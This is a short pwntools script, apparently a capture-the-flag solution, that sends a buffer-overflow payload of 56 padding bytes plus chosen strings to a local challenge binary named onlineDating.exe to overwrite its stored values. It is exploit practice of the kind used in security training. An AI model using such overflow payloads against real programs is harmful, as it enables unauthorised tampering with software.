from pwn import *

garbage=b'A'*56+b'Gerard_Pique'+b'Clara_C.'+b'TwingoOo'+b'CasioOo!'
print(garbage)
elf=ELF("./onlineDating.exe")
p=process("./onlineDating.exe")
p.sendline(garbage)
msg=p.recvall()
print(msg)